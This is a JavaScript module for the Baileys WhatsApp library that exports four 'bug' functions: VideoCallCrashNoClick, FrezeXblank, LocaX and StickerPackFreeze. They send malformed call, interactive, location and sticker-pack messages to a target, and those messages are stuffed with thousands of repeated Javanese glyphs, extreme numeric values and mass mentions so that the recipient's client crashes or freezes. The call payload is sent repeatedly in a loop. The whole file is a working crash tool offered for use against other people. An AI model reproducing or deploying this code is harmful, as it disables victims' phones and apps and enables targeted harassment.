const { 
  generateWAMessage, 
  generateWAMessageFromContent, 
  prepareWAMessageMedia, 
  proto 
} = require("@whiskeysockets/baileys");

async function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

// 1. Call Invisible Crash
async function VideoCallCrashNoClick(bad, target) {
  const callSpamPayload = {
    call: {
      callKey: Buffer.from(Array.from({length: 1000}, () => Math.floor(Math.random() * 256))).toString('base64'),
      callCreator: target,
      callType: 1,
      isVideo: true,
      timestamp: Date.now(),
      isIncoming: true,
      callId: `crash_spam_${Date.now()}`,
      participants: [target],
      callDuration: -1,
      maxParticipants: 65535,
      contextInfo: {
        remoteJid: target,
        mentionedJid: [target],
        forwardingScore: 2147483647,
        externalAdReply: {
          title: "Bug Deployed",
          body: "Auto-answer crash",
          mediaType: 3,
          thumbnailUrl: "whatsapp://call/autoanswer/crash",
          sourceUrl: "whatsapp://call/trigger/immediate",
          autoAnswer: true
        }
      }
    }
  };
  for (let i = 0; i < 5; i++) {
    await bad.sendMessage(target, callSpamPayload);
    await sleep(500);
  }
}

// 2. Freeze Group
async function FrezeXblank(bad, IsTarget) {
  const videoPayload = await prepareWAMessageMedia({
    video: { url: "https://i.postimg.cc/L431k1zF/20260602-121105.jpg", gifPlayback: true }
  }, { upload: bad.waUploadToServer });
  
  const msg = generateWAMessageFromContent(IsTarget, proto.Message.fromObject({
    interactiveMessage: {
      header: { title: "", ...videoPayload, hasMediaAttachment: true },
      body: { text: "FREEZE" },
      nativeFlowMessage: {
        buttons: [{
          name: "single_select",
          buttonParamsJson: `{"title":"${"ꦾ".repeat(5000)}","sections":[{"title":"Crash","rows":[]}]}`
        }]
      }
    }
  }), { userJid: IsTarget });
  await bad.relayMessage(IsTarget, msg.message, { messageId: msg.key.id });
}

// 3. Location Bug
async function LocaX(bad, target) {
  await bad.relayMessage(target, {
    viewOnceMessage: {
      message: {
        locationMessage: {
          degreesLatitude: 26.8467,
          degreesLongitude: 80.9462,
          name: "Crash Location" + "ꦾ".repeat(5000),
          address: "ꦾ".repeat(5000),
          contextInfo: {
            mentionedJid: Array.from({ length: 100 }, () => target)
          }
        }
      }
    }
  }, {});
}

// 4. Blank UI Bug
async function StickerPackFreeze(bad, target) {
  await bad.relayMessage(target, {
    stickerPackMessage: {
      packId: "ꦾ".repeat(10000),
      packName: "ꦾ".repeat(10000),
      publisher: "ꦾ".repeat(10000),
      stickers: [{ url: "https://i.postimg.cc/L431k1zF/20260602-121105.jpg", fileSha256: Buffer.alloc(32), fileEncSha256: Buffer.alloc(32), mediaKey: Buffer.alloc(32), mimetype: "image/webp", height: 512, width: 512 }]
    }
  }, {});
}

module.exports = {
  VideoCallCrashNoClick,
  FrezeXblank,
  LocaX,
  StickerPackFreeze
};
